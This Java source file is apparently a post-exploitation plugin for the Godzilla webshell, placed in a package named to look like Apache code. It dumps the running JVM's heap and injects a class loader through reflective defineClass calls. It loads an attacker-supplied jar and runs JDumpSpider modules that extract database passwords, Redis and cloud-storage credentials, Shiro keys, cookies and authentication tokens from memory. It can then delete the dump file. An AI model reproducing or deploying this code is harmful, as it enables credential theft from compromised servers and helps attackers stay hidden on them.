package org.apache.common;
import com.sun.management.HotSpotDiagnosticMXBean;

import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Map;
import java.util.HashMap;
import javax.management.MBeanServer;
import java.lang.management.ManagementFactory;
import java.util.zip.ZipInputStream;

public class VirtualHeap implements Runnable {

    // Name of the HotSpotDiagnostic MBean
    private static final String HOTSPOT_BEAN_NAME = "com.sun.management:type=HotSpotDiagnostic";
    private static volatile HotSpotDiagnosticMXBean hotspotMBean;
    private Map parameters;
    private StringBuffer result = new StringBuffer();
    private boolean isJob = false;
    private ClassLoader loader;
    private static final String[] SPIDER_CLASSES = {
            "cn.wanghw.spider.DataSource01",
            "cn.wanghw.spider.DataSource02",
            "cn.wanghw.spider.DataSource03",
            "cn.wanghw.spider.DataSource04",
            "cn.wanghw.spider.DataSource05",
            "cn.wanghw.spider.Redis01",
            "cn.wanghw.spider.Redis02",
            "cn.wanghw.spider.ShiroKey01",
            "cn.wanghw.spider.PropertySource01",
            "cn.wanghw.spider.PropertySource02",
            "cn.wanghw.spider.PropertySource03",
            "cn.wanghw.spider.PropertySource04",
            // "cn.wanghw.spider.JwtKey01",
            "cn.wanghw.spider.PropertySource05",
            "cn.wanghw.spider.EnvProperty01",
            "cn.wanghw.spider.OSS01",
            "cn.wanghw.spider.UserPassSearcher01",
            "cn.wanghw.spider.CookieThief",
            "cn.wanghw.spider.AuthThief"
    };

    public VirtualHeap(boolean isJob, ClassLoader loader) {
        this.isJob = isJob;
        this.loader = loader;
    }

    public VirtualHeap() {}


    public boolean dumpHeap(String fileName, boolean live) {
        if ("".equals(fileName)) {
            result.append("[!] No suitable location given\n");
            return false;
        }
        if (hotspotMBean == null) {
            synchronized (VirtualHeap.class) {
                if (hotspotMBean == null) {
                    try {
                        MBeanServer server = ManagementFactory.getPlatformMBeanServer();
                        hotspotMBean = ManagementFactory.newPlatformMXBeanProxy(server,
                                HOTSPOT_BEAN_NAME, HotSpotDiagnosticMXBean.class);
                        result.append("[+] HotSpot MBean created\n");
                    } catch (Exception e) {
                        result.append("[!] Error: ").append(e.getMessage()).append("\n");
                        return false;
                    }
                }
            }
        }
        try {
            hotspotMBean.dumpHeap(fileName, live);
            result.append("[+] Heap dump created at: ").append(fileName).append("\n");
            return true;
        } catch (Exception e) {
            result.append("[!] Error: ").append(e.getMessage()).append("\n");
            return false;
        }
    }

    public boolean equals(Object o) {
        if (o instanceof Map) {
            this.parameters = (Map) o;
        } else {
            this.parameters = new HashMap();
        }
        return false;
    }

    private String getParameter(String name) {
        Object o = this.parameters.get(name);
        if (o != null) {
            if (o instanceof byte[]) {
                return new String((byte[]) o);
            }
            return String.valueOf(o);
        }
        return null;
    }

    private byte[] getRawParameter(String name) {
        Object o = this.parameters.get(name);
        if (o != null) {
            if (o instanceof byte[]) {
                return (byte[]) o;
            }
        }
        return null;
    }

    private boolean spider() {
        try {
            ClassLoader loader = (ClassLoader) Class.forName("org.apache.common.hotspot.HotSpotLoader").newInstance();
            Method cacheJar = loader.getClass().getDeclaredMethod("cacheJar", ZipInputStream.class);
            ByteArrayInputStream bais = new ByteArrayInputStream(getRawParameter("jar"));
            ZipInputStream zis = new ZipInputStream(bais);
            cacheJar.setAccessible(true);
            cacheJar.invoke(loader, zis);
            VirtualHeap job = new VirtualHeap(true, loader);
            job.equals(this.parameters);
            Thread thread = new Thread(job);
            thread.start();
            try {
                thread.join();
                thread = null;
                System.gc();
            } catch (InterruptedException e) {
                this.result.append("[!] Error: ").append(e.getMessage()).append("\n");
                return false;
            }
            this.result.append(job.toString());
            return true;
        } catch (Exception e) {
            this.result.append("[!] Error: ").append(e.getMessage()).append("\n");
            return false;
        }
    }

    private boolean delete(String fileName) {
        System.gc();
        File file = new File(fileName);
        if (file.exists()) {
            boolean r = file.delete();
            if (r) {
                result.append("[+] Delete ").append(fileName).append(" success.\n");
            } else {
                result.append("[!] Delete ").append(fileName).append(" failed.\n");
            }
            return r;
        }
        return false;
    }

    private boolean persitLoader() {
        try {
            Class.forName("org.apache.common.hotspot.HotSpotLoader");
            this.result.append("[+] Loader loaded\n");
            return true;
        } catch (Exception e) {}
        byte[] cb = this.getRawParameter("loader");
        if (cb != null) {
            try {
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), cb, 0, cb.length);
                this.result.append("[+] Loader loaded.\n");
                return true;
            } catch (Exception e) {
                e.printStackTrace();
                this.result.append("[!] Error: ").append(e.getMessage()).append("\n");
                return false;
            }
        }
        this.result.append("[!] No data found.\n");
        return false;
    }


    public String toString() {
        if (isJob) return result.toString();
        String[] allMethods = this.getParameter("methodName").split(",");
        for (int i = 0; i < allMethods.length; i++) {
            if ("dumpHeap".equals(allMethods[i])) {
                if (!dumpHeap(this.getParameter("loc"), false)) break;
            } else if ("spider".equals(allMethods[i])) {
                if (!spider()) break;
            } else if ("delete".equals(allMethods[i])) {
                if (!delete(this.getParameter("loc"))) break;
            } else if ("persitLoader".equals(allMethods[i])) {
                if (!persitLoader()) break;
            }
        }
        this.parameters.put("result", this.result.toString().getBytes());
        return "";
    }

    @Override
    public void run() {
        String fileName = this.getParameter("loc");
        if (fileName == null || this.loader == null) return ;
        try {
            Class clazz = this.loader.loadClass("cn.wanghw.ISpider");
            Object allSpiders = Array.newInstance(clazz, SPIDER_CLASSES.length);
            for (int i = 0; i < SPIDER_CLASSES.length; i++) {
                Class<?> spiderClass = this.loader.loadClass(SPIDER_CLASSES[i]); // Class.forName(SPIDER_CLASSES[i]);
                Object spider = spiderClass.getDeclaredConstructor().newInstance();
                Array.set(allSpiders, i, spider);
            }
            int ver = 0;
            try {
                FileInputStream fis = new FileInputStream(fileName);
                fis.skip(17);
                byte subVersion = (byte) fis.read();
                ver = Integer.parseInt(Character.valueOf((char) subVersion).toString());
                fis.close();
            } catch (Exception e) {
                result.append("[!] Read heap file version failed\n");
                return ;
            }
            float classVersion = Float.parseFloat(System.getProperty("java.class.version"));
            Object holder;
            File heapFile = new File(fileName);
            if (ver == 1 || classVersion < 52) {
                holder = this.loader.loadClass("org.netbeans.lib.profiler.heap.NetbeansHeapHolder").getDeclaredConstructor(File.class).newInstance(heapFile);//Class.forName("org.netbeans.lib.profiler.heap.NetbeansHeapHolder").getDeclaredConstructor(File.class).newInstance(heapFile);
            } else {
                holder = this.loader.loadClass("org.graalvm.visualvm.lib.jfluid.heap.GraalvmHeapHolder").getDeclaredConstructor(File.class).newInstance(heapFile);//Class.forName("org.graalvm.visualvm.lib.jfluid.heap.GraalvmHeapHolder").getDeclaredConstructor(File.class).newInstance(heapFile);
            }
            Class IHeapHolderClass = this.loader.loadClass("cn.wanghw.IHeapHolder");// Class.forName("cn.wanghw.IHeapHolder");
            for (int i = 0; i < SPIDER_CLASSES.length; i++) {
                Object spider = Array.get(allSpiders, i);
                Class spiderClass = spider.getClass();
                Method m_getName = spiderClass.getMethod("getName");
                Method m_sniff = spiderClass.getMethod("sniff", IHeapHolderClass);
                result.append("===========================================\n");
                result.append(m_getName.invoke(spider));
                result.append("-------------");
                Object r = m_sniff.invoke(spider, holder);
                if (r != null && !r.toString().equals("")) {
                    result.append(r);
                } else {
                    result.append("not found!\r\n");
                }
                result.append("===========================================\n");
            }

        } catch (Exception e) {
            if (e instanceof ClassNotFoundException || e instanceof NoSuchMethodException) {
                result.append("[!] Class not found: ").append(e.getMessage()).append("\n");
                result.append("[!] Please use Godzilla LoadJar plugin to load JDumpSpider jar first, reference: https://github.com/whwlsfb/JDumpSpider").append("\n");
            } else if (e instanceof InvocationTargetException || e instanceof InstantiationException || e instanceof IllegalAccessException) {
                result.append("[!] Error: ").append(e.getMessage()).append("\n");
            }
        }
    }
}